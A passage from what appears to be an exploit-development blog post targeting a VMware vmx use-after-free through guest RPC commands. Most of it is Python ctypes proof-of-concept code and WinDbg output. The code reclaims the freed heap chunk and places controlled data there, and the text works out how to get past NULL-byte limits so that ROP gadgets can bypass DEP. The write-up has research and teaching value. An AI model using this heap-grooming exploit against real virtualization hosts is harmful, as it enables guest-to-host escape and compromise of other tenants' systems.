+<span class="normal"><a href="#__codelineno-6-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a>    <span class="n">cmd</span> <span class="o">=</span> <span class="n">create_string_buffer</span><span class="p">(</span><span class="s2">&quot;tools.capability.guest_temp_directory AAAA..AAAA&quot;</span><span class="p">)</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2"></a>    <span class="n">inbuf</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xb0</span> <span class="o">+</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">)</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3"></a>    <span class="n">memmove</span><span class="p">(</span><span class="n">inbuf</span><span class="p">,</span> <span class="n">addressof</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4"></a>    <span class="n">memset</span><span class="p">(</span><span class="n">inbuf</span> <span class="o">+</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">)</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5"></a>
+<a id="__codelineno-6-6" name="__codelineno-6-6"></a>    <span class="n">outLen</span> <span class="o">=</span> <span class="n">c_ulong</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7"></a>    <span class="n">outbuf</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">outLen</span><span class="o">.</span><span class="n">value</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">)</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8"></a>
+<a id="__codelineno-6-9" name="__codelineno-6-9"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x40</span><span class="p">):</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10"></a>        <span class="n">RpcSendRequest</span><span class="p">(</span><span class="n">inbuf</span><span class="p">,</span> <span class="mh">0xb0</span> <span class="o">+</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">outbuf</span><span class="p">,</span> <span class="n">pointer</span><span class="p">(</span><span class="n">outLen</span><span class="p">))</span>
+</code></pre></div></td></tr></table></div>
+<p>After running this POC and checking the output, it is clear that we do in-fact gain allocation in the target block. This can be seen below.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-7-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-7-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-7-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-7-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-7-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-7-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-7-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-7-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-7-10">10</a></span>
+<span class="normal"><a href="#__codelineno-7-11">11</a></span>
+<span class="normal"><a href="#__codelineno-7-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a>Breakpoint 0 hit
+<a id="__codelineno-7-2" name="__codelineno-7-2"></a>vmware_vmx+0x9d0aa:
+<a id="__codelineno-7-3" name="__codelineno-7-3"></a>00007ff7`e209d0aa 488b01          mov     rax,qword ptr [rcx] ds:00000000`03a62d20=41412e2e2e414141
+<a id="__codelineno-7-4" name="__codelineno-7-4"></a>0:013&gt; dd ecx
+<a id="__codelineno-7-5" name="__codelineno-7-5"></a>00000000`03a62d20  2e414141 41412e2e 41414141 41414141
+<a id="__codelineno-7-6" name="__codelineno-7-6"></a>00000000`03a62d30  41414141 41414141 41414141 41414141
+<a id="__codelineno-7-7" name="__codelineno-7-7"></a>00000000`03a62d40  41414141 41414141 41414141 41414141
+<a id="__codelineno-7-8" name="__codelineno-7-8"></a>00000000`03a62d50  41414141 41414141 41414141 41414141
+<a id="__codelineno-7-9" name="__codelineno-7-9"></a>00000000`03a62d60  41414141 41414141 41414141 41414141
+<a id="__codelineno-7-10" name="__codelineno-7-10"></a>00000000`03a62d70  41414141 41414141 41414141 41414141
+<a id="__codelineno-7-11" name="__codelineno-7-11"></a>00000000`03a62d80  41414141 41414141 41414141 41414141
+<a id="__codelineno-7-12" name="__codelineno-7-12"></a>00000000`03a62d90  41414141 41414141 41414141 41414141
+</code></pre></div></td></tr></table></div>
+<h2 id="guestupgradersend_cmd_line_args">guest.upgrader.send_cmd_line_args<a class="headerlink" href="#guestupgradersend_cmd_line_args" title="Permanent link">&para;</a></h2>
+<p>Equally, we can also test that this RPC command works in the same way as <code>tools.capability.guest_temp_directory</code>, as it turns out, it does. In-fact, all RPC guest commands share the same LFH, therefore pretty much any of them will work. But, not all of them are completely ideal for various reasons.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-8-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-8-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-8-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-8-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-8-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-8-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-8-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-8-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-8-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a>    <span class="n">cmd</span> <span class="o">=</span> <span class="n">create_string_buffer</span><span class="p">(</span><span class="s2">&quot;guest.upgrader.send_cmd_line_args AAAA&quot;</span><span class="p">)</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2"></a>    <span class="n">inbuf</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xb0</span> <span class="o">+</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">)</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3"></a>    <span class="n">memmove</span><span class="p">(</span><span class="n">inbuf</span><span class="p">,</span> <span class="n">addressof</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4"></a>    <span class="n">memset</span><span class="p">(</span><span class="n">inbuf</span> <span class="o">+</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">)</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5"></a>
+<a id="__codelineno-8-6" name="__codelineno-8-6"></a>    <span class="n">outLen</span> <span class="o">=</span> <span class="n">c_ulong</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7"></a>    <span class="n">outbuf</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">outLen</span><span class="o">.</span><span class="n">value</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">)</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8"></a>
+<a id="__codelineno-8-9" name="__codelineno-8-9"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x40</span><span class="p">):</span>
+<a id="__codelineno-8-10" name="__codelineno-8-10"></a>        <span class="n">RpcSendRequest</span><span class="p">(</span><span class="n">inbuf</span><span class="p">,</span> <span class="mh">0xb0</span> <span class="o">+</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">outbuf</span><span class="p">,</span> <span class="n">pointer</span><span class="p">(</span><span class="n">outLen</span><span class="p">))</span>
+</code></pre></div></td></tr></table></div>
+<p>After running this POC and checking the output, it is clear that we do in-fact gain allocation in the target block. This can be seen below.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-9-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-9-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-9-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-9-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-9-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-9-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-9-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-9-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-9-10">10</a></span>
+<span class="normal"><a href="#__codelineno-9-11">11</a></span>
+<span class="normal"><a href="#__codelineno-9-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a>Breakpoint 0 hit
+<a id="__codelineno-9-2" name="__codelineno-9-2"></a>vmware_vmx+0x9d0aa:
+<a id="__codelineno-9-3" name="__codelineno-9-3"></a>00007ff7`e209d0aa 488b01          mov     rax,qword ptr [rcx] ds:00000000`03a62d20=41414141414141414141414141414141
+<a id="__codelineno-9-4" name="__codelineno-9-4"></a>0:013&gt; dd ecx
+<a id="__codelineno-9-5" name="__codelineno-9-5"></a>00000000`03a62d20  41414141 41414141 41414141 41414141
+<a id="__codelineno-9-6" name="__codelineno-9-6"></a>00000000`03a62d30  41414141 41414141 41414141 41414141
+<a id="__codelineno-9-7" name="__codelineno-9-7"></a>00000000`03a62d40  41414141 41414141 41414141 41414141
+<a id="__codelineno-9-8" name="__codelineno-9-8"></a>00000000`03a62d50  41414141 41414141 41414141 41414141
+<a id="__codelineno-9-9" name="__codelineno-9-9"></a>00000000`03a62d60  41414141 41414141 41414141 41414141
+<a id="__codelineno-9-10" name="__codelineno-9-10"></a>00000000`03a62d70  41414141 41414141 41414141 41414141
+<a id="__codelineno-9-11" name="__codelineno-9-11"></a>00000000`03a62d80  41414141 41414141 41414141 41414141
+<a id="__codelineno-9-12" name="__codelineno-9-12"></a>00000000`03a62d90  41414141 41414141 41414141 41414141
+</code></pre></div></td></tr></table></div>
+<h2 id="avoiding-nulls">Avoiding NULLs<a class="headerlink" href="#avoiding-nulls" title="Permanent link">&para;</a></h2>
+<p>User-mode addresses on 64-bit systems always contain a NULL word (due to their length), this prevents a problem in our case. The command expects a NULl terminated string as an argument. This means that if we were to put a pointer in the argument, for example a pointer to a ROP gadget, due to the NULL byte in the address, the argument string would be terminated early and and our content would be allocated to a smaller bucket. This means that using this function isn't going to work because we need to use ROP gadgets to bypass DEP and take control of the application flow. We can test this theory out by placing a fake pointer in our buffer and checking the contents of ECX.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-10-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-10-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-10-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-10-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-10-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-10-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-10-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-10-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-10-10">10</a></span>
+<span class="normal"><a href="#__codelineno-10-11">11</a></span>
+<span class="normal"><a href="#__codelineno-10-12">12</a></span>
+<span class="normal"><a href="#__codelineno-10-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a>Breakpoint 0 hit
+<a id="__codelineno-10-2" name="__codelineno-10-2"></a>vmware_vmx+0x9d0aa:
+<a id="__codelineno-10-3" name="__codelineno-10-3"></a>00007ff7`e209d0aa 488b01          mov     rax,qword ptr [rcx] ds:00000000`059525f0=00007ff7e27a74a8
+<a id="__codelineno-10-4" name="__codelineno-10-4"></a>
+<a id="__codelineno-10-5" name="__codelineno-10-5"></a>0:012&gt; dd ecx
+<a id="__codelineno-10-6" name="__codelineno-10-6"></a>00000000`059525f0  e27a74a8 00007ff7 03dae8a0 00000000
+<a id="__codelineno-10-7" name="__codelineno-10-7"></a>00000000`05952600  05b63470 00000000 05b632b0 00000000
+<a id="__codelineno-10-8" name="__codelineno-10-8"></a>00000000`05952610  03b6b320 00000000 00000003 00000000
+<a id="__codelineno-10-9" name="__codelineno-10-9"></a>00000000`05952620  cec10001 00000000 00000000 00000000
+<a id="__codelineno-10-10" name="__codelineno-10-10"></a>00000000`05952630  00000000 00000000 00000000 00000000
+<a id="__codelineno-10-11" name="__codelineno-10-11"></a>00000000`05952640  00000000 00000000 00000000 00000000
+<a id="__codelineno-10-12" name="__codelineno-10-12"></a>00000000`05952650  00000000 00000000 00000000 00000000
+<a id="__codelineno-10-13" name="__codelineno-10-13"></a>00000000`05952660  00000000 00000000 00000000 00000000
+</code></pre></div></td></tr></table></div>
+<p>As you can see, if we attempt to put a fake pointer in the buffer, once the NULL byte is detected, it cuts the allocation short and our allocation doesn't work as it did before. This is a huge problem because as we explained, user-mode addresses in 64-bit contains NULL bytes.</p>
+<p>To get around this we are going to adopt a different reallocation technique. If we look back at <code>RpcSendRequest</code> we see that our function first sends the data size through <code>MessageSendSize</code> and then sends the actual payload through <code>MessageSendData</code>. Based on our testing, we know that <strong>all</strong> RPC requests are served by the same LFH heap. We can try to use this to directly use these two functions to perform reallocation control rather than relying on a specific RPC command.</p>
+<p>We are going to update our proof of concept with two very unique sizes for <code>MessageSendSize</code> and <code>MessageSendData</code> respectively. You can see the changes in the below code block.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-11-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-11-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-11-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-11-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-11-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-11-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-11-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-11-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-11-10">10</a></span>
+<span class="normal"><a href="#__codelineno-11-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="k">def</span> <span class="nf">realloc</span><span class="p">():</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2"></a>    <span class="n">inbuf</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">)</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3"></a>    <span class="n">memset</span><span class="p">(</span><span class="n">inbuf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">)</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4"></a>    <span class="n">pointer</span> <span class="o">=</span> <span class="n">c_ulonglong</span><span class="p">(</span><span class="mh">0x0000414141414141</span><span class="p">)</span> <span class="c1"># fake memory pointer</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5"></a>    <span class="n">memmove</span><span class="p">(</span><span class="n">inbuf</span><span class="p">,</span> <span class="n">addressof</span><span class="p">(</span><span class="n">pointer</span><span class="p">),</span> <span class="mh">0x8</span><span class="p">)</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6"></a>
+<a id="__codelineno-11-7" name="__codelineno-11-7"></a>    <span class="n">chan</span> <span class="o">=</span> <span class="n">MESSAGE_CHANNEL</span><span class="p">()</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8"></a>    <span class="n">OpenChannel</span><span class="p">(</span><span class="n">chan</span><span class="p">)</span>
+<a id="__codelineno-11-9" name="__codelineno-11-9"></a>    <span class="n">MessageSendSize</span><span class="p">(</span><span class="n">chan</span><span class="p">,</span> <span class="mh">0xAA9</span><span class="p">)</span>
+<a id="__codelineno-11-10" name="__codelineno-11-10"></a>    <span class="n">MessageSendData</span><span class="p">(</span><span class="n">chan</span><span class="p">,</span> <span class="n">inbuf</span><span class="p">,</span> <span class="mh">0xAA9</span><span class="p">)</span>
+<a id="__codelineno-11-11" name="__codelineno-11-11"></a>    <span class="n">MessageClose</span><span class="p">(</span><span class="n">chan</span><span class="p">)</span>
+</code></pre></div></td></tr></table></div>
+<p>As you can see, we are now using the mentioned functions with a unique size which should help us locate the allocation on the heap from WinDbg. Before executing the updated POC we will set a breakpoint on WinDbg using .printf in order to track the heap allocations of our target size.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1"></a>bp ntdll!RtlpAllocateHeap &quot;.printf \&quot;Req size: 0x%p Round size: 0x%p\&quot;, @r8, @r9; .echo; gc&quot;
+</code></pre></div></td></tr></table></div>
+<p>Following this breakpoint, we run the POC until the input is requested in our script, at which point we break the application, set a breakpoint at <code>vmware_vmx+0x9d0aa</code> and then allow execution to continue. Eventually, we should see the following in our WinDbg output:</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span>
+<span class="normal"><a href="#__codelineno-13-2">2</a></span>
+<span class="normal"><a href="#__codelineno-13-3">3</a></span>
+<span class="normal"><a href="#__codelineno-13-4">4</a></span>
+<span class="normal"><a href="#__codelineno-13-5">5</a></span>
+<span class="normal"><a href="#__codelineno-13-6">6</a></span>
+<span class="normal"><a href="#__codelineno-13-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1"></a>Req size: 0x0000000000000aaa Round size: 0x0000000000000ac0
+<a id="__codelineno-13-2" name="__codelineno-13-2"></a>Req size: 0x00000000000000f8 Round size: 0x0000000000000100
+<a id="__codelineno-13-3" name="__codelineno-13-3"></a>Req size: 0x0000000000000260 Round size: 0x0000000000000270
+<a id="__codelineno-13-4" name="__codelineno-13-4"></a>
+<a id="__codelineno-13-5" name="__codelineno-13-5"></a>Breakpoint 1 hit
+<a id="__codelineno-13-6" name="__codelineno-13-6"></a>vmware_vmx+0x9d0aa:
+<a id="__codelineno-13-7" name="__codelineno-13-7"></a>00007ff7`e209d0aa 488b01          mov     rax,qword ptr [rcx] ds:00000000`0473d5c0=00007ff7e27a74a8
+</code></pre></div></td></tr></table></div>
+<p>As shown in the first line, we can see that our allocation is in-fact rounded up to 0xAAA bytes due to the NULL byte terminator. Let's restart the VM, and now we can place a conditional breakpoint on <code>RtlpAllocateHeap</code> specifying 0xAAA as the allocation size.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1"></a>bp ntdll!RtlpAllocateHeap &quot;.if(@r8 == 0xAAA) {} .else {gc}&quot;
+</code></pre></div></td></tr></table></div>
+<p>When executing the POC again, we should hit the breakpoint, then we can check the output of the registers and check the status of the heap.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-15-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-15-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-15-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-15-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-15-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-15-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-15-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-15-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-15-10">10</a></span>
+<span class="normal"><a href="#__codelineno-15-11">11</a></span>
+<span class="normal"><a href="#__codelineno-15-12">12</a></span>
+<span class="normal"><a href="#__codelineno-15-13">13</a></span>
+<span class="normal"><a href="#__codelineno-15-14">14</a></span>
+<span class="normal"><a href="#__codelineno-15-15">15</a></span>
+<span class="normal"><a href="#__codelineno-15-16">16</a></span>
+<span class="normal"><a href="#__codelineno-15-17">17</a></span>
+<span class="normal"><a href="#__codelineno-15-18">18</a></span>
+<span class="normal"><a href="#__codelineno-15-19">19</a></span>
+<span class="normal"><a href="#__codelineno-15-20">20</a></span>
+<span class="normal"><a href="#__codelineno-15-21">21</a></span>
+<span class="normal"><a href="#__codelineno-15-22">22</a></span>
+<span class="normal"><a href="#__codelineno-15-23">23</a></span>
+<span class="normal"><a href="#__codelineno-15-24">24</a></span>
+<span class="normal"><a href="#__codelineno-15-25">25</a></span>
+<span class="normal"><a href="#__codelineno-15-26">26</a></span>
+<span class="normal"><a href="#__codelineno-15-27">27</a></span>
+<span class="normal"><a href="#__codelineno-15-28">28</a></span>
+<span class="normal"><a href="#__codelineno-15-29">29</a></span>
+<span class="normal"><a href="#__codelineno-15-30">30</a></span>
+<span class="normal"><a href="#__codelineno-15-31">31</a></span>
+<span class="normal"><a href="#__codelineno-15-32">32</a></span>
+<span class="normal"><a href="#__codelineno-15-33">33</a></span>
+<span class="normal"><a href="#__codelineno-15-34">34</a></span>
+<span class="normal"><a href="#__codelineno-15-35">35</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1"></a>ntdll!RtlpAllocateHeap:
+<a id="__codelineno-15-2" name="__codelineno-15-2"></a>00007ffe`e886dad0 4c894c2420      mov     qword ptr [rsp+20h],r9 ss:00000000`0628f6d8=00000000010acec0
+<a id="__codelineno-15-3" name="__codelineno-15-3"></a>
+<a id="__codelineno-15-4" name="__codelineno-15-4"></a>0:013&gt; r
+<a id="__codelineno-15-5" name="__codelineno-15-5"></a>rax=0000000001482038 rbx=0000000001480000 rcx=0000000001480000
+<a id="__codelineno-15-6" name="__codelineno-15-6"></a>rdx=0000000000000002 rsi=0000000000000000 rdi=000000000000002c
+<a id="__codelineno-15-7" name="__codelineno-15-7"></a>rip=00007ffee886dad0 rsp=000000000628f6b8 rbp=000000000628f7c0
+<a id="__codelineno-15-8" name="__codelineno-15-8"></a> r8=0000000000000aaa  r9=0000000000000ac0 r10=7efefefefefefeff
+<a id="__codelineno-15-9" name="__codelineno-15-9"></a>r11=8101010101010100 r12=0000000000000000 r13=0000000000000ac0
+<a id="__codelineno-15-10" name="__codelineno-15-10"></a>r14=0000000000000000 r15=0000000000000aaa
+<a id="__codelineno-15-11" name="__codelineno-15-11"></a>iopl=0         nv up ei pl nz na pe nc
+<a id="__codelineno-15-12" name="__codelineno-15-12"></a>cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+<a id="__codelineno-15-13" name="__codelineno-15-13"></a>
+<a id="__codelineno-15-14" name="__codelineno-15-14"></a>ntdll!RtlpAllocateHeap:
+<a id="__codelineno-15-15" name="__codelineno-15-15"></a>00007ffe`e886dad0 4c894c2420      mov     qword ptr [rsp+20h],r9 ss:00000000`0628f6d8=00000000010acec0
+<a id="__codelineno-15-16" name="__codelineno-15-16"></a>
+<a id="__codelineno-15-17" name="__codelineno-15-17"></a>0:013&gt; pt
+<a id="__codelineno-15-18" name="__codelineno-15-18"></a>ntdll!RtlpAllocateHeap+0x235b:
+<a id="__codelineno-15-19" name="__codelineno-15-19"></a>00007ffe`e886fe2b c3              ret
+<a id="__codelineno-15-20" name="__codelineno-15-20"></a>
+<a id="__codelineno-15-21" name="__codelineno-15-21"></a>0:013&gt; !heap -p -a rax
+<a id="__codelineno-15-22" name="__codelineno-15-22"></a>    address 0000000004408d20 found in
+<a id="__codelineno-15-23" name="__codelineno-15-23"></a>    _HEAP @ 1480000
+<a id="__codelineno-15-24" name="__codelineno-15-24"></a>              HEAP_ENTRY Size Prev Flags            UserPtr UserSize - state
+<a id="__codelineno-15-25" name="__codelineno-15-25"></a>        0000000004408d10 00ac 0000  [00]   0000000004408d20    00aaa - (busy)
+<a id="__codelineno-15-26" name="__codelineno-15-26"></a>
+<a id="__codelineno-15-27" name="__codelineno-15-27"></a>0:013&gt; dq rax
+<a id="__codelineno-15-28" name="__codelineno-15-28"></a>00000000`04408d20  00000000`0655fce0 00000000`04414600
+<a id="__codelineno-15-29" name="__codelineno-15-29"></a>00000000`04408d30  00000000`80270000 00000000`00001000
+<a id="__codelineno-15-30" name="__codelineno-15-30"></a>00000000`04408d40  00000000`d6b19000 00000000`00001000
+<a id="__codelineno-15-31" name="__codelineno-15-31"></a>00000000`04408d50  00000000`80270000 00000000`00001000
+<a id="__codelineno-15-32" name="__codelineno-15-32"></a>00000000`04408d60  00000000`80270000 00000000`00001000
+<a id="__codelineno-15-33" name="__codelineno-15-33"></a>00000000`04408d70  00000000`80270000 00000000`00001000
+<a id="__codelineno-15-34" name="__codelineno-15-34"></a>00000000`04408d80  00000000`80270000 00000000`00001000
+<a id="__codelineno-15-35" name="__codelineno-15-35"></a>00000000`04408d90  00000000`d6a18000 00000000`00001000
+</code></pre></div></td></tr></table></div>
+<p>In the above output, you can clearly see in R8 that our allocation size 0xAAA is present. Additionally, if we check the RAX register we can see that the state is "busy". Let's allow execution to continue for a few seconds before issuing a break and then reinspecting the allocation content.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span>
+<span class="normal"><a href="#__codelineno-16-2">2</a></span>
+<span class="normal"><a href="#__codelineno-16-3">3</a></span>
+<span class="normal"><a href="#__codelineno-16-4">4</a></span>
+<span class="normal"><a href="#__codelineno-16-5">5</a></span>
+<span class="normal"><a href="#__codelineno-16-6">6</a></span>
+<span class="normal"><a href="#__codelineno-16-7">7</a></span>
+<span class="normal"><a href="#__codelineno-16-8">8</a></span>
+<span class="normal"><a href="#__codelineno-16-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1"></a>0:016&gt; dq 04408d20
+<a id="__codelineno-16-2" name="__codelineno-16-2"></a>00000000`04408d20  00000000`0682c100 00000000`046a0f20
+<a id="__codelineno-16-3" name="__codelineno-16-3"></a>00000000`04408d30  41414141`41414141 41414141`41414141
+<a id="__codelineno-16-4" name="__codelineno-16-4"></a>00000000`04408d40  41414141`41414141 41414141`41414141
+<a id="__codelineno-16-5" name="__codelineno-16-5"></a>00000000`04408d50  41414141`41414141 41414141`41414141
+<a id="__codelineno-16-6" name="__codelineno-16-6"></a>00000000`04408d60  41414141`41414141 41414141`41414141
+<a id="__codelineno-16-7" name="__codelineno-16-7"></a>00000000`04408d70  41414141`41414141 41414141`41414141
+<a id="__codelineno-16-8" name="__codelineno-16-8"></a>00000000`04408d80  41414141`41414141 41414141`41414141
+<a id="__codelineno-16-9" name="__codelineno-16-9"></a>00000000`04408d90  41414141`41414141 41414141`41414141
+</code></pre></div></td></tr></table></div>
+<p>As you can see, I didn't quite wait long enough for the full allocation, but it appears to have worked and we are clearly no longer restricted by the NULL bytes.</p>
